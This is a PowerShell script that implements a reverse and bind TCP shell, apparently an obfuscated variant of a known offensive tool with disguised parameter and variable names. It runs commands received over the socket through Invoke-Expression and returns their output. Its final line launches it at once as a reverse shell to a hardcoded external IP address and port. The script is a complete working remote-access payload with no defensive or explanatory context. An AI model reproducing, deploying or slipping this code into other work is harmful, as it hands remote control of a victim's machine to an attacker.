function Invoke-Shell 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $World,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Country,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    try 
    {
        if ($Reverse)
        {
            $dGtrfokiudfjhvnjfe = New-Object System.Net.Sockets.TCPClient($World,$Country)
        }

        if ($Bind)
        {
            $eDDfh987654567 = [System.Net.Sockets.TcpListener]$Country
            $eDDfh987654567.start()    
            $dGtrfokiudfjhvnjfe = $eDDfh987654567.AcceptTcpClient()
        } 

        $zrt54789dvbgH = $dGtrfokiudfjhvnjfe.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        $gfklighloiujGHds = ([text.encoding]::ASCII).GetBytes("Windows PowerShell`nMicrosoft Corporation.`n`n")
        $zrt54789dvbgH.Write($gfklighloiujGHds,0,$gfklighloiujGHds.Length)

        $gfklighloiujGHds = ([text.encoding]::ASCII).GetBytes('$ ' + (Get-Location).Path + '>>')
        $zrt54789dvbgH.Write($gfklighloiujGHds,0,$gfklighloiujGHds.Length)

        while(($i = $zrt54789dvbgH.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                $Poec56fd345 = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something wrong" 
                Write-Error $_
            }
            $GFGFGBbvbgrefdf  = $Poec56fd345 + 'PS ' + (Get-Location).Path + '> '
            $ggh45RedCzIk = ($error[0] | Out-String)
            $error.clear()
            $GFGFGBbvbgrefdf = $GFGFGBbvbgrefdf + $ggh45RedCzIk

            $sendbyte = ([text.encoding]::ASCII).GetBytes($GFGFGBbvbgrefdf)
            $zrt54789dvbgH.Write($sendbyte,0,$sendbyte.Length)
            $zrt54789dvbgH.Flush()  
        }
        $dGtrfokiudfjhvnjfe.Close()
        if ($eDDfh987654567)
        {
            $eDDfh987654567.Stop()
        }
    }
    catch
    {
        Write-Warning "Something wrong!" 
        Write-Error $_
    }
}

Invoke-Shell -Reverse -world 213.168.249.164 -CountrY 9898
